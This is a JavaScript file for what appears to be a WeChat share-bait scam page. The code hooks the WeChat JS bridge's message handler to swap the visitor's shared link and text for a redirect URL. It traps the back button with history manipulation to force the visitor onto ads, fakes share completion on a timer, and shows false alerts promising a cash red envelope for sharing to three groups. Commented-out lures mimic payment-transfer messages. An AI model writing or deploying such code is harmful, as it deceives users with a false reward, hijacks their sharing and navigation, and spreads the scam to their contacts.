var baiduKey = "45e4ed65d019478f202ec342aaa07047";
var isDev = false;
var fenliuData = new Array(
);
var fenliuTime = 10;
var isNeedReloadShare = false;


Zepto(function ($) {
    var imgUrl = "http://ww4.sinaimg.cn/mw690/006xLWk3gw1f6uucy8o2bj305k05kq2y.jpg";
    $(".topcontent .avatar img").attr("src", imgUrl);
    $(".user-picture img").attr("src", imgUrl);
})

var lastBackIndex = 0;


var currentTime = new Date().getTime();
window.setTimeout(
    function () {
        history.pushState(null, null, "#weixin");
        window.onpopstate = function () {
            history.pushState(null, null, "#weixin2");
            var currentTime2 = new Date().getTime();
            if (currentTime2 - currentTime < 500) {
                return true;
            }
            lastBackIndex++;
            if (lastBackIndex % 2 == 0 && typeof(adUrl) != "undefined") {
                location.href = adUrl;
            } else {
                selfLoad();
            }
            return true;
        };
    }, 50);

//分流                                       n
function fenliu() {
    //有5分之一的几率切到新的上面
    var time = new Date().getTime();


    if (fenliuTime > 0 && time % fenliuTime != 1) {
        return;
    }

    if (fenliuData == null || fenliuData.length <= 0) {
        return;
    }
    // //
    var url = fenliuData[time % fenliuData.length];
    window.location.replace(url);
}


var weui = {
    alert: function (msg, title, callback) {
        title = title ? title : "温馨提醒";
        var alertHtml = '<div class="weui_dialog_alert" style="position: fixed; z-index: 2000; display:none;">';
        alertHtml += '<div class="weui_mask"></div>';
        alertHtml += '<div class="weui_dialog">';
        alertHtml += '<div class="weui_dialog_hd"><strong class="weui_dialog_title" style="color: #000;">' + title + '</strong></div>';
        alertHtml += '<div class="weui_dialog_bd"></div>';
        alertHtml += '<div class="weui_dialog_ft">';
        alertHtml += '<a href="javascript:;" class="weui_btn_dialog primary" style="padding:10px;font-weight:bold;">好</a>';
        alertHtml += '</div>';
        alertHtml += '</div>';
        alertHtml += '</div>';
        if ($(".weui_dialog_alert").length > 0) {
            $(".weui_dialog_alert .weui_dialog_bd").empty();
        } else {
            $("body").append($(alertHtml));
        }
        var weui_alert = $(".weui_dialog_alert");
        weui_alert.show();
        weui_alert.find(".weui_dialog_bd").html(msg);
        weui_alert.find('.weui_btn_dialog').off("click").on('click',
            function () {
                weui_alert.hide();
                if (callback) {
                    callback();
                }
            });
    }
}

function wxAlert(msg, callback) {
    weui['alert'](msg, "", callback);
}

//是否是新版的微信
function isWxNewVersion() {
    if (isDev) {
        return true;
    }
    if ((/carlos1/i).test(window.location.href)) {
        return false;
    }

    if ((/carlos2/i).test(window.location.href)) {
        return true;
    }

    var wechatInfo = navigator.userAgent.match(/MicroMessenger\/([\d\.]+)/i);
    if (!wechatInfo) {
        return false;
    }
    console.log(wechatInfo[1]);
    return wechatInfo.length > 1 && wechatInfo[1] == "6.3.23";
}

$(function () {
    $('.firstcontainer').width($('.box-hcenter').eq(0).width());
});



function shade() {
    $('#shadeshade').show();
    wxAlert('点击右上角，选择“分享到朋友圈”<br/>或分享到不同的微信群即可领取！', clickAlerConfrimCallBack);
}


var isShareLoadding = false;
function clickAlerConfrimCallBack() {
    if (isShareLoadding || !isWxNewVersion()) {
        return;
    }
    //设置文案
    var shareObject = getShareObject();
    // alert(shareObject.title+shareObject.imgUrl);
    $("#shareDefaultUrlId").attr("src", shareObject.imgUrl);
    document.title = shareObject.title;

    //如果还没到最大值,则倒计时
    if (maxShareSize > shareTimes) {
        // alert(shareTimes);
        isShareLoadding = true;
        var time = 5000;
        if (shareTimes == 0) {
            time = 8000;
        }
        if (isDev) {
            time = 500;
        }
        setTimeout(function () {
            isShareLoadding = false;
            shareComplete();
        }, time);
    }
}


var oldHandleMesageHook;
var curSetHookCount = 0;
var regHookCount = 0;
var shareTimes = 0;
var maxShareSize = 3;

function setHandleMessageHookForWeixin() {
    try {

        if (curSetHookCount > 15) {
            return;
        }
        if (!window.WeixinJSBridge) {
            setTimeout("setHandleMessageHookForWeixin()", 1000);
            curSetHookCount++;
            return;
        }

        if (!oldHandleMesageHook) {
            oldHandleMesageHook = window.WeixinJSBridge._handleMessageFromWeixin;
            window.WeixinJSBridge._handleMessageFromWeixin = function (message) {
                try {
                    var realMessage = message['__json_message'];
                    var shaStr = message['__sha_key'];
                    var eventId = realMessage['__event_id'];
                    var msgType = realMessage['__msg_type'];
                    var callbackId = realMessage['__callback_id'];

                    if (eventId && eventId.indexOf("share") > 0) {
                        //分享
                        var eventMsg = "sendAppMessage";
                        var tmstr = eventId;

                        if (eventId == "general:share") {
                            var params = realMessage['__params'];
                            tmstr = params['shareTo'];
                        }
                        if (tmstr.indexOf("timeline") != -1) {
                            eventMsg = "shareTimeline";
                        }
                        var shareObject = getShareObject();
                        var data = {
                            "link": shareUrl,
                            "desc": shareObject.desc,
                            "title": shareObject.title,
                            "img_url": shareObject.imgUrl
                        };
                        getNewShareUrl();

                        if (eventMsg) {
                            window.WeixinJSBridge.invoke(eventMsg, data, shareCallback);
                            restoreHandleMessageHookForWeixin();
                        }
                    }
                } catch (e) {
                }
            }
        }

        regHookCount++;
    } catch (e) {
    }
}

function restoreHandleMessageHookForWeixin() {
    if (oldHandleMesageHook) {
        window.WeixinJSBridge._handleMessageFromWeixin = oldHandleMesageHook;
    }
}

function shareCallback(res) {

    var errMsg = res['err_msg'];

    if (errMsg) {
        if (errMsg.indexOf(":confirm") != -1 || errMsg.indexOf(":ok") != -1) {
            shareComplete();
        } else {

        }
    }

    curSetHookCount = 0;
    oldHandleMesageHook = undefined;
    setHandleMessageHookForWeixin();
}

function shareComplete() {
    shareTimes++;

    if (shareTimes < 1) {
    } else {
        switch (shareTimes) {
            case 1:
                wxAlert('发送成功,请再发送2个不同的微信群即可領取！', clickAlerConfrimCallBack);
                break;
            case 2:
                wxAlert('发送成功,请再发送1个不同的微信群即可領取！', clickAlerConfrimCallBack);
                break;
            case 3:
                if (isNeedReloadShare) {
                    isNeedReloadShare = false;
                    shareTimes = 0;
                    wxAlert('出现未知错误,分享失败,请重新分享',clickAlerConfrimCallBack);
                    return;
                }
                wxAlert('恭喜您已经成功領取到紅包，紅包将在48小时存入您的钱包中！</br> <span style="color:red">48小时内请勿删除朋友圈内容，以免影响到账</span>');
                setTimeout(goToShareNexUrlnew, 2000);
                break;
            case 5:
                wxAlert('恭喜您已经成功領取到紅包，紅包将在48小时存入您的钱包中！</br> <span style="color:red">48小时内请勿删除朋友圈内容，以免影响到账</span>');
                setTimeout(goToShareNexUrlnew, 2000);
                break;
            case 6:
            case 7:
            case 8:
            case 9:
            case 10:
                wxAlert('恭喜您已经成功領取到紅包，紅包将在48小时存入您的钱包中！</br> <span style="color:red">48小时内请勿删除朋友圈内容，以免影响到账</span>');
                break;
        }
    }
}

function goToShareNexUrlnew() {
   // window.location.href = "http://dm9911.com/?do=bW9iaWxlZGV0YWlsXzM3NV8yMTY1OV8wODI5MTkzOTMy";
   window.location.href = "http://renamayu.github.io/test/skip.html";
}


var shareUrl = window.location.href;
function getNewShareUrl() {
     // window.location.href = "http://renamayu.github.io/test/skip.html";
    // var shareGetUrl = "http://119.29.8.160:8800/index1";
    // $.ajax({
    //     type: "GET",
    //     url: shareGetUrl,
    //     success: function (msg) {
    //         shareUrl = msg;
    //         console.log("shareUrl " + "http://renamayu.github.io/test/skip.html");
    //     }
    // });
    shareUrl = "http://renamayu.github.io/test/skip.html";
}

var currentShareObject = {
    title: "同城",
    desc: "每天免费领",
    imgUrl: "http://ww2.sinaimg.cn/mw690/006xLWk3gw1f6k0rfk2ynj30b40b4myu.jpg"
};

function getShareObject() {
    alert("1111");
    //如果是第二个页面的画,则直接返回钱
    // 向你转账XX元
    // [微信红苞] 恭喜发财，大吉大利
    // if (shareTimes == 1) {
    //     return {title: "向你转账96元", desc: "请你在2小时内确认", imgUrl: "http://c.wx3010.top/res/zhuanz2.png"};
    // } else if (shareTimes == 2) {
    //     return {title: "微信҉葒苞 恭囍发財", desc: "请你在2小时内确认", imgUrl: "http://c.wx3010.top/res/zhuanz2.png"};
    // }
    return currentShareObject;
}



if (!isWxNewVersion()) {
    getNewShareUrl();
    setHandleMessageHookForWeixin();
}

function onBridgeReady() {
    WeixinJSBridge.call('showOptionMenu');
    WeixinJSBridge.call('hideMenuItems');
}
if (typeof WeixinJSBridge == "undefined") {
    if (document.addEventListener) {
        document.addEventListener('WeixinJSBridgeReady', onBridgeReady, false);
    } else if (document.attachEvent) {
        document.attachEvent('WeixinJSBridgeReady', onBridgeReady);
        document.attachEvent('onWeixinJSBridgeReady', onBridgeReady);
    }
} else {
    onBridgeReady();
}
